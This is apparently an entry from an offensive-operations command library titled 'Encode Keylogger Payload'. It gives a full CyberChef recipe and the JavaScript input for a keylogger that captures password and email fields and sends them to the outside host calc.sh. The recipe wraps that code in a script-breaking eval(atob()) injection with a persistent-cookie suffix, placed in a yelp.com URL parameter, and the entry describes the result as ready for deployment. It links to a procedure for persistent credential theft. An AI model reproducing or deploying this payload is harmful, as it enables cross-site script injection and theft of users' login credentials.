---
data: >-
  Visit
  https://gchq.github.io/CyberChef/#recipe=JavaScript_Minify()To_Base64('A-Za-z0-9%2B/%3D')Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'asdf%20guvo%3D%3C/script%3E%3Cscript%3Eeval(atob(%5C'',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'$'%7D,'%5C'))//;Max-Age%3D99999999',true,false,true,false)URL_Encode(true)Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'https://yelp.com/?canary%3D',true,false,true,false)&input=setTimeout(function
  () { a = document.getElementsByName('password')[0]; b =
  document.getElementsByName('email')[0]; function f(){
  fetch(`https://calc.sh/?a=${encodeURIComponent(a.value)}&b=${encodeURIComponent(b.value)}`);
  } a.form.onclick=f; a.onchange=f; b.onchange=f; a.oninput=f; b.oninput=f; },
  1000)
tags:
  - encoding
  - keylogger
type: command
output: >-
  Encoded URL:
  https://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval%28atob%28%27c2V0VGltZW91dC...%27%29%29%2F%2F%3BMax-Age%3D99999999
executor: browser
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:34.336Z'
id: 43e7a335-a8aa-4cef-a7c4-5190a52aa0c5
verified: false
validated: true
submitted: true
---
# Encode Keylogger Payload

## Command

Visit CyberChef and apply the recipe with input JS.

```url
https://gchq.github.io/CyberChef/#recipe=JavaScript_Minify()To_Base64('A-Za-z0-9%2B/%3D')Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'asdf%20guvo%3D%3C/script%3E%3Cscript%3Eeval(atob(%5C'',true,false,true,false)Find_/_Replace(%7B'option':'Regex','string':'$'%7D,'%5C'))//;Max-Age%3D99999999',true,false,true,false)URL_Encode(true)Find_/_Replace(%7B'option':'Regex','string':'%5E'%7D,'https://yelp.com/?canary%3D',true,false,true,false)&input=setTimeout(function () { a = document.getElementsByName('password')[0]; b = document.getElementsByName('email')[0]; function f(){ fetch(`https://calc.sh/?a=${encodeURIComponent(a.value)}&b=${encodeURIComponent(b.value)}`); } a.form.onclick=f; a.onchange=f; b.onchange=f; a.oninput=f; b.oninput=f; }, 1000)
```

## Description

Encodes a JS keylogger for injection: minifies, base64-encodes, wraps for eval, adds smuggling prefix/suffix, and URL-encodes for canary param.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| input | Raw JS keylogger code | Yes |
| recipe | CyberChef operations chain | Yes |

## Examples

### Basic Usage

Paste JS into CyberChef input and run recipe.

### Advanced Usage

Adjust exfil URL in input JS before encoding.

## Expected Output

Full encoded URL ready for deployment.

## Related

- [[commands/deploy-keylogger-url]]
- [[procedures/Deploy-Persistent-Keylogger-for-Credential-Theft]]
